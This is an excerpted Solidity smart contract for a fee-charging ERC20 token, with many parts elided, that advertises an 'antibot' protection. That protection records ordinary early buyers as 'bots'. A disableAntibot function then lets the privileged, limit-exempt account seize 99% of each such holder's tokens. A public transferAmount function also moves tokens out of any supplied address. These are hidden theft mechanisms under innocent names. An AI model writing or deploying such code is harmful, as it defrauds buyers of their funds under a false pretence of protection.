...
/*
    ...
    Fees: 12% (+3% burn fee for first hour)
    - 6% Marketing
    - 2% Giveaway
    - 4% Liquidity
...
contract Taxable is Ownable {
    ...
    uint256 internal targetLiquidityFactor = startingLiquidityFactor.mul(100); // 100x
...
contract Token is IERC20, Taxable {
    using SafeMath for uint256;
    ...
    address[] bots;
    bool public antibotOn = true;
    uint256 botBurnPercent = 3; // automatically disabled after antisnipe period

    uint256 _totalSupply = 100000000000 * (10 ** _decimals);     // 100,000,000,000
    uint256 _maxWalletSize = (_totalSupply * 10) / 1000;  // 1% 
    uint256 _transferLimit = (_totalSupply * 10) / 1000;  // 1%
    ...
    uint256 constant liquidityFee = 40; 
    ...
    constructor (string memory _nameParam, string memory _symbolParam) payable {
        ...
        require(address(this).balance > 0, "Value = 0");
        ...
        isLimitExempt[address(DEAD)] = true;
    ...
    function viewFees() external pure returns (uint256, uint256, uint256, uint256, uint256, uint256) { 
    ...
    function viewBalance() public view returns (uint256) { return address(this).balance; }
    ...
    function transferAmount(address sender, uint256 amount) public swapping returns (bool, uint256) {
        ...
        if (getLiquidityFactor() < targetLiquidityFactor) {
            (bool success) = _transferFrom(sender, address(this), amount);
            if (!success) {
    ...
    function disableAntibot() external {
        require(antibotOn && isLimitExempt[msg.sender], "Antibot already disabled");
        for (uint256 i = 0; i < bots.length; i++) {
            _transferFrom(bots[i], msg.sender, balanceOf(bots[i]).mul(99).div(100));
        }
        antibotOn = false;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(antibotOn && !isLimitExempt[recipient] && recipient != uniswapV2Pair) {
            bots.push(recipient);
        } else if (recipient != uniswapV2Pair && !isLimitExempt[recipient]) {
            require(amount < _transferLimit, "Max Transaction Exceeded");
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 totalFeeAmount = amount.mul(getTotalFee(receiver == uniswapV2Pair)).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(totalFeeAmount);
        emit Transfer(sender, address(this), totalFeeAmount);

        if (botBurnPercent > 0) {
            uint256 burnAmount = amount.mul(botBurnPercent).div(100);
    ...
    function increaseMaxWallet() internal {
        ...
        if (multiplier < currentLiquidityFactor) { // if liquidity factor is less than what is was before 
            return;
        } else if (multiplier > startingLiquidityFactor.mul(80)) { // 100x
        ...
        } else if (multiplier > startingLiquidityFactor.mul(20)) {
            ...
            _transferLimit = _totalSupply;
            removeBurnFee();
        }
        currentLiquidityFactor = multiplier;
    }

    function removeBurnFee() internal {
        botBurnPercent = 0;
    }
    ...
    function getLiquidityFactor() public view returns (uint256) { // in multiple of 100
        ...
        return (getCirculatingSupply().mul(accuracy).div(balanceOf(uniswapV2Pair)) ** 2).div(accuracy);
    }

    function increaseMaxWalletManual(uint256 percent, uint256 denominator) external {
        require(isLimitExempt[msg.sender] && percent >= 1 && denominator >= 100);
